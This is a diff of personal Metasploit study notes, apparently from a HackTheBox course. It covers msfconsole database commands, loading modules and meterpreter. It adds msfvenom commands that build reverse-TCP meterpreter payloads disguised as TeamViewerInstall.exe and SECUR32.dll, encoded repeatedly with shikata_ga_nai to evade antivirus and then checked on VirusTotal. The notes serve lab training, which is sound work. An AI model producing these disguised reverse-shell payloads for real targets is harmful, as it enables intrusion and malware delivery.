@@ -100,77 +100,117 @@ Database Backend Commands
 
 =========================
 
-db_connect        Connect to an existing data service
+# Previously
+sudo systemctl start postgresq
+sudo msfdb init
+sudo msfdb run
+msfdb reinit
 
-db_disconnect     Disconnect from the current data service
+#####
+# workspaces 
+#####
+#  Switch between database
+workspace        
 
-db_export         Export a file containing the contents of the database
-Before closing the session, save a backup:
+# List workspaces
+workspace         
+
+# List workspaces verbosely
+workspace -v      
+
+# Switch workspace
+workspace [name]  
+
+# Add workspace(s)
+workspace -a [name] ...    
+
+# Delete workspace(s)
+workspace -d [name] ...    
+
+# Delete all workspaces
+workspace -D
+
+# Rename workspace
+workspace -r
+
+# Show this help information
+workspace -h     
+
+#####
+# workspaces 
+#####
+# Connect to an existing data service
+db_connect        
+
+# Disconnect from the current data service
+db_disconnect     
+
+# Export a file containing the contents of the database
+db_export         
+
+# Before closing the session, save a backup:
 db_export -f xml backup.xml
 
-db_import         Import a scan result file (filetype will be auto-detected)
-For instance: 
-db_import Target.xml
+# Import a scan result file (filetype will be auto-detected)
+db_import         
+# For instance: 
+db_import Target.xml 
+# Or:
 db_import Target.nmap
 
-db_nmap           Executes nmap and records the output automatically
 
-After that, we can query: 
-hosts
-# The hosts command displays a database table automatically populated with the host addresses, hostnames, and other information we find about these during our scans and interactions. 
-services. 
-# host -h # to see all commands with hosts 
+#####
+# ## Using Nmap Inside MSFconsole 
+#####
+# Executes nmap and records the output automatically
+db_nmap    
 
-services
-# It contains a table with descriptions and information on services discovered during scans or interactions.
-# services -h # to see all commands with services 
+# List all hosts in the database
+hosts             
 
+# List stored Credentials. The `creds` command allows you to visualize the credentials gathered during your interactions with the target host. We can also add credentials manually, match existing credentials with port specifications, add descriptions, etc.
 creds
-# The creds command allows you to visualize the credentials gathered during your interactions with the target host.
-# creds -h # to see all commands with creds 
 
-loot
-# The loot command works in conjunction with the command above to offer you an at-a-glance list of owned services and users. The loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more.
-# loot -h # to see all commands with loot 
+# List all loot in the database. The `loot` command works in conjunction with the command above to offer you an at-a-glance list of owned services and users. The loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more: 
+loot              
 
-db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
+# List all notes in the database
+notes             
 
-db_remove         Remove the saved data service entry
+#  List all services in the database.The `services` command functions the same way as the previous one. It contains a table with descriptions and information on services discovered during scans or interactions. In the same way as the command above, the entries here are highly customizable. 
+services         
 
-db_save           Save the current data service connection as the default to reconnect on startup
+# List all vulnerabilities in the database
+vulns      
 
-db_status         Show the current data service status
+# After finishing the session, make sure to back up our data if anything happens with the PostgreSQL service. 
+db_export -f xml backup.xml
 
-hosts             List all hosts in the database
 
-loot              List all loot in the database
+# Rebuilds the database-stored module cache (deprecated)
+db_rebuild_cache  
 
-notes             List all notes in the database
+# Remove the saved data service entry
+db_remove         
 
-services          List all services in the database
+#  Save the current data service connection as the default to reconnect on startup
+db_save          
 
-vulns             List all vulnerabilities in the database
+#  Show the current data service status
+db_status        
 
-workspace         Switch between database 
-workspace         List workspaces
-workspace -v      List workspaces verbosely
-workspace [name]  Switch workspace
-workspace -a [name] ...    Add workspace(s)
-workspace -d [name] ...    Delete workspace(s)
-workspace -D     Delete all workspaces
-workspace -r     Rename workspace
-workspace -h     Show this help information
 ```
 
 Cheat sheet: 
 
 ```msf
-# Search modules
+# Search modules and filter with grep
 search <mysearchitem> 
 grep meterpreter show payloads
 grep -c meterpreter grep reverse_tcp show payloads
+#-c is for counting the results
 
-# Search for exploit of service hfs 2.3 serve
+# Search for exploit of service hfs 2.3 serve in ExploitDB's entries
 searchsploit hfs 2.3
 
 #  launch msfconsole and run the reload_all command for the newly installed module to appear in the list
@@ -293,6 +333,20 @@ To install new custom plugins not included in new updates of the distro, we can 
 [Incognito (pre-installed)](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/)
 [Darkoperator's](https://github.com/darkoperator/Metasploit-Plugins)
 
+Afterward, launch `msfconsole` and check the plugin's installation by running the `load` command. After the plugin has been loaded, the `help menu` at the `msfconsole` is automatically extended by additional functions.
+
+```
+# MSF - Loading Additional Modules at Runtime
+cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
+msfconsole -m /usr/share/metasploit-framework/modules/
+
+
+# #### MSF - Loading Additional Modules
+loadpath /usr/share/metasploit-framework/modules/
+
+reload_all
+```
+
 
 ## Meterpreter
 
@@ -307,8 +361,6 @@ show options
 
 sessions 
 ```
-
-
 
 
 ## meterpreter commands
@@ -396,7 +448,10 @@ netstat
 portfwd       
 
 # Resolve a set of hostnames on the target
-resolve       
+resolve     
+
+# Send Session to backgroud
+bg
 ```
 
 More commands
@@ -421,39 +476,75 @@ msf6> help
 ```
 
 
-## metasploit modules
+## Encoders
 
-Located at /usr/share/metasploit-framework/modules. They have the following structure:
+`Encoders` come into play with the role of changing the payload to run on different operating systems and architectures. These architectures include: `x64`, `x86`, `sparc`, `ppc`, `mips`.
+
+Shikata Ga Nai (`SGN`) is one of the most utilized Encoding schemes today because it is so hard to detect that payloads encoded through its mechanism are not universally undetectable anymore.
+
+**Generating Payload - Without Encoding**
 
 ```
-<No.> <type>/<os>/<service>/<name>
-794   exploit/windows/ftp/scriptftp_list
+# #### Generating Payload - Without Encoding
+# For instance, crafting a DLL file with a webshell
+#########
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IPAttacker> LPORT=<4444> -a x86 -f dll > SECUR32.dll
+# -p: for the chosen payload
+# -a: architecture in the victim machine/application
+# -f: format for the output file
+
+# List enconders
+show encoders
 ```
 
 
-If we do not want to use our web browser to search for a specific exploit within ExploitDB, we can use the CLI version, searchsploit.
+**Generating Payload - With Encoding**
+
+```
+# #### Generating Payload - With Encoding
+# crafting a .exe file with Shikata Ga Nai encoder
+#########
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
+# -e: chosen encoder 
+
+```
+
+We can run multiple iterations of the same encoding scheme to escape EDS/IDR 
+
+```
+# #### Generating Payload - With Encoding - 
+# Running multiple iterations
+#########
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
+#
+
+```
+
+![image](https://academy.hackthebox.com/storage/modules/39/S8_SS02.png)
+
+As we can see, it is still not enough for AV evasion. There is a high number of products that still detect the payload. Alternatively, Metasploit offers a tool called `msf-virustotal` that we can use with an API key to analyze our payloads. However, this requires free registration on VirusTotal.
+
+#### MSF - VirusTotal
+
+  Encoders
 
 ```shell-session
-searchsploit nagios3
-
-
-search type:exploit platform:windows cve:2021 rank:excellent microsoft
+amandaguglieri@htb[/htb]$ msf-virustotal -k <API key> -f TeamViewerInstall.exe
 ```
 
 
-How to download and install an exploit from exploitdb:
+## Modules
 
-```bash
-# Search for it from website or using searchsploit and download it. It should have .rb extension
-searchsploit nagios3
+###  multi/handler
 
-# The default directory where all the modules, scripts, plugins, and `msfconsole` proprietary files are stored is `/usr/share/metasploit-framework`. The critical folders are also symlinked in our home and root folders in the hidden `~/.msf4/` location. 
-# Make sure that our home folder .msf4 location has all the folder structure that the /usr/share/metasploit-framework/. If not, `mkdir` the appropriate folders so that the structure is the same as the original folder so that `msfconsole` can find the new modules.
+Setting Up Multi/Handler
 
-# After that, we will be proceeding with copying the .rb script directly into the primary location.
+```shell-session
+use multi/handler
 ```
+### search local_exploit_suggester
 
-
+Once you've gained foothold in a system, this module helps you find ways to exploit the target further (provileges escalation).
 
 ### auxiliary/scanner/smb/smb_login
 
